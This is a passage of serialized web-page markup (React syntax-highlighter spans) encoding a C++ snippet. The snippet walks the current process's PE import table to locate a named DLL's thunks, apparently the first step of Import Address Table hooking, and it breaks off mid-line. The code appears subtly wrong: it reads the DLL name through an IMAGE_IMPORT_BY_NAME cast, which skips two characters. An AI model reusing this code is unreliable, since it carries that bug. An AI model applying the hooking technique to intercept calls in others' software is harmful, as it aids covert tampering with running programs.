function\",\"style\":{},\"children\":[\"GetModuleHandle\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  PIMAGE_DOS_HEADER dosHeader \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_DOS_HEADER\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  PIMAGE_NT_HEADERS64 ntHeader \"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_NT_HEADERS64\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DWORD64\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" dosHeader\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"e_lfanew\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  IMAGE_OPTIONAL_HEADER64 optionalHeader \"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" ntHeader\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"OptionalHeader\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  IMAGE_DATA_DIRECTORY imageDataDirectory \"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      optionalHeader\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DataDirectory\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"IMAGE_DIRECTORY_ENTRY_IMPORT\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  PIMAGE_IMPORT_DESCRIPTOR imageImportDescriptor \"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_IMPORT_DESCRIPTOR\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DWORD64\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule \"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                 imageDataDirectory\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"VirtualAddress\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[15]}],\"\\n\",[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"while\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"imageImportDescriptor\"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"FirstThunk\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[17]}],\"\\n\",[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    PIMAGE_IMPORT_BY_NAME dllIBN \"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_IMPORT_BY_NAME\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DWORD64\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule \"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" imageImportDescriptor\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Name\"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    std\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cout \"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" dllIBN\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Name \"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" std\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"endl\"]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token function\",\"style\":{},\"children\":[\"string\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"dllName\"]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"token function\",\"style\":{},\"children\":[\"compare\"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"dllIBN\"]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement191\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Name\"]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement196\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      PIMAGE_THUNK_DATA64 originalFirstThunk \"]}],[\"$\",\"span\",\"code-segement203\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement204\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement207\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement208\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_THUNK_DATA64\"]}],[\"$\",\"span\",\"code-segement209\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DWORD64\"]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule \"]}],[\"$\",\"span\",\"code-segement215\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                imageImportDescriptor\"]}],[\"$\",\"span\",\"code-segement219\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement220\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"OriginalFirstThunk\"]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement223\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      PIMAGE_THUNK_DATA64 firstThunk \"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement227\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement230\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PIMAGE_THUNK_DATA64\"]}],[\"$\",\"span\",\"code-segement232\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement234\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"DWORD64\"]}],[\"$\",\"span\",\"code-segement236\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"hModule \"]}],[\"$\",\"span\",\"code-segement238\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                imageImportDescriptor\"]}],[\"$\",\"span\",\"code-segement242\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 